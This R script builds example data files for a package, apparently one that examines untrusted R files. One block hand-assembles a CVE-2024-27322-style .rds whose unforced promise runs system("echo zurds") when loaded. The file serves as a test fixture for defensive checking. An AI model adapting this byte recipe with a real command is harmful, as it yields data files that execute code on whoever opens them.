# Writes the small files under inst/extdata/ that the examples, the README
# and the vignette read (roadmap Stage 11). Run from the package root:
#   Rscript tools/make-extdata.R
out <- file.path("inst", "extdata")
dir.create(out, recursive = TRUE, showWarnings = FALSE)
set.seed(1)

# An .rda of data and one function: what a colleague might send.
local({
  cars <- head(mtcars, 10)
  species <- iris$Species[c(1, 51, 101)]
  grid <- matrix(round(runif(6), 3), 2, 3)
  summarise <- function(x) c(mean = mean(x), sd = sd(x))
  environment(summarise) <- globalenv()
  save(cars, species, grid, summarise, file = file.path(out, "objects.rda"))
})

# A model saved with its data: lm() objects carry a formula and its
# environment.
local({
  fit <- lm(mpg ~ wt, data = mtcars)
  saveRDS(list(data = head(mtcars[c("mpg", "wt")]), fit = fit), file.path(out, "model.rds"))
})

# Data only.
saveRDS(head(iris, 20), file.path(out, "iris.rds"))

# A CVE-2024-27322-style file: an unforced promise whose code would call
# system("echo zurds"). Built by hand, since R refuses to write one.
local({
  int <- function(...) writeBin(as.integer(c(...)), raw(), endian = "big")
  chars <- function(s) c(int(262153, nchar(s)), charToRaw(s))
  call <- c(int(6, 1), chars("system"), int(2, 16, 1), chars("echo zurds"), int(254))
  bytes <- c(charToRaw("X\n"), int(3, 263681, 197888, 5), charToRaw("UTF-8"),
             int(19, 2, 16, 1), chars("harmless"), int(5 + 1024, 253, 252), call)
  con <- gzfile(file.path(out, "promise.rds"), "wb")
  writeBin(bytes, con)
  close(con)
})

# A lazy-load database, as R CMD INSTALL writes a package's.
local({
  e <- new.env()
  e$letters2 <- letters[1:5]
  e$table <- data.frame(id = 1:3, name = c("a", "b", "c"))
  e$helper <- function(x) x
  environment(e$helper) <- globalenv()
  tools:::makeLazyLoadDB(e, file.path(out, "lazy"))
})
print(file.info(list.files(out, full.names = TRUE))["size"])
